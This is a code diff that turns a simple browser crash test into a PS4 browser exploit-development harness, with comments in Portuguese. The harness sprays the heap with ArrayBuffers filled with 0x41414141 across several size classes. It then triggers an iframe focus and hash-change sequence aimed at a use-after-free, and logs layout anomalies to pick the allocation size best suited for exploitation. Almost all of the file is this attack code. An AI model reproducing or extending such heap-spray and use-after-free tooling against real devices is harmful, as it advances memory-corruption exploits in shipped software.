@@ -1,21 +1,151 @@
-<!DOCTYPE html>
-<html>
-<head>
+
 <style>
-* { z-index: -1; }
-html { position: sticky; }
-</style>
-<script>
-  onload = () => {
-    diag = document.getElementById('diag0');
-    diag.showModal(); 
-   
+  iframe { content: url(); zoom: 0.01; }
+  #out {
+    position: fixed; top: 0; right: 0;
+    width: 280px; height: 180px;
+    background: #000; color: #0f0;
+    font: 10px monospace;
+    overflow: hidden; padding: 4px;
+    z-index: 9999;
   }
+</style>
+<div id="out">aguardando...</div>
+<script>
+  // ── Saída visível na tela — PS4 não tem console acessível ─────────────
+  let ciclo = 0;
+  const out = document.getElementById('out');
+  function log(msg) {
+    out.textContent = '[' + ciclo + '] ' + msg + '\n'
+                    + out.textContent.slice(0, 800);
+  }
+
+  const MAX_CICLOS  = 150;
+  const SIZE_CLASSES = [0x100, 0x140, 0x180, 0x1c0, 0x200, 0x240, 0x280];
+  let _spray    = null;
+  const anomalias = [];
+
+  // ── Spray ─────────────────────────────────────────────────────────────
+  function fazerSpray(sz) {
+    try {
+      _spray = null;
+      const buf = [];
+      for (let i = 0; i < 512; i++) {
+        const ab = new ArrayBuffer(sz);
+        new Uint32Array(ab).fill(0x41414141);
+        buf.push(ab);
+      }
+      _spray = buf;
+    } catch(e) { log('ERR spray: ' + e.message); }
+  }
+
+  // ── Detecção de anomalia ───────────────────────────────────────────────
+  function checar(tag, sz) {
+    try {
+      const r = i0.getBoundingClientRect();
+      if (r.width === 0 && r.height === 0) {
+        anomalias.push({ ciclo, sz, tag, e: 'geom-zero' });
+        log('! ' + tag + ' geom-zero sz=0x' + sz.toString(16));
+      }
+    } catch(e) {
+      anomalias.push({ ciclo, sz, tag, e: e.message });
+      log('! ' + tag + ' ERR: ' + e.message);
+    }
+  }
+
+  // ── Estratégias ────────────────────────────────────────────────────────
+  const EST = [
+    { label: 'A-baseline',
+      fn: () => {} },
+
+    { label: 'B-layout-thrash',
+      fn: () => { try {
+        for (let i = 0; i < 8; i++) {
+          i0.style.outline = i + 'px solid red';
+          void i0.offsetWidth;
+        }
+        i0.style.outline = '';
+      } catch(e) { log('ERR B: ' + e.message); } } },
+
+    { label: 'C-zoom-cycle',
+      fn: () => { try {
+        i0.style.zoom = '0.02'; void i0.offsetWidth;
+        i0.style.zoom = '0.01'; void i0.offsetWidth;
+      } catch(e) { log('ERR C: ' + e.message); } } },
+
+    { label: 'D-content-cycle',
+      fn: () => { try {
+        i0.style.content = 'url(about:blank)'; void i0.offsetWidth;
+        i0.style.content = 'url()';            void i0.offsetWidth;
+      } catch(e) { log('ERR D: ' + e.message); } } },
+
+    { label: 'E-gc-pressure',
+      fn: () => { try {
+        const tmp = [];
+        for (let i = 0; i < 30; i++) tmp.push(new ArrayBuffer(1024 * 1024));
+      } catch(e) { log('ERR E: ' + e.message); } } },
+
+    { label: 'F-post-layout',
+      fn: () => { try {
+        void i0.offsetWidth;
+        void i0.getBoundingClientRect();
+        void i0.offsetWidth;
+      } catch(e) { log('ERR F: ' + e.message); } } },
+  ];
+
+  // ── Relatório final ───────────────────────────────────────────────────
+  function relatorio() {
+    log('FIM: ' + ciclo + ' ciclos | ' + anomalias.length + ' anomalias');
+    if (anomalias.length > 0) {
+      const freq = {};
+      anomalias.forEach(a => { freq[a.sz] = (freq[a.sz] || 0) + 1; });
+      const top = Object.entries(freq).sort((a, b) => b[1] - a[1])[0];
+      log('CANDIDATA: 0x' + parseInt(top[0]).toString(16)
+          + ' (' + top[1] + 'x)');
+    } else {
+      log('sem anomalia JS');
+      log('UAF ocorre em C++ puro');
+    }
+  }
+
+  // ── Loop original — intacto ──────────────────────────────────────────
+  onload = () => {
+    log('onload ok');
+    document.documentElement.append(document.createElement('frameset'));
+
+    i0.onfocus = () => {
+      // PRIMEIRO LOG — antes de qualquer outro código
+      log('onfocus');
+
+      if (ciclo >= MAX_CICLOS) {
+        i0.onfocus = null;
+        relatorio();
+        return;
+      }
+
+      const sz  = SIZE_CLASSES[ciclo % SIZE_CLASSES.length];
+      const est = EST[ciclo % EST.length];
+
+      if (ciclo % 10 === 0)
+        log(est.label + ' sz=0x' + sz.toString(16));
+
+      fazerSpray(sz);
+      est.fn();
+      checar('pre', sz);
+
+      location.hash = 'y';   // ← intacto
+
+      fazerSpray(sz);
+      checar('post', sz);
+
+      ciclo++;
+    };
+
+    location.hash = 'x';   // ← intacto
+
+    let s0 = document.createElement('script');
+    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
+    document.head.append(s0);
+  };
 </script>
-</head>
-<body>
-<dialog id="diag0">
-PASS if this doesn't crash
-</dialog>
-</body>
-</html>
+<iframe id="i0"></iframe>
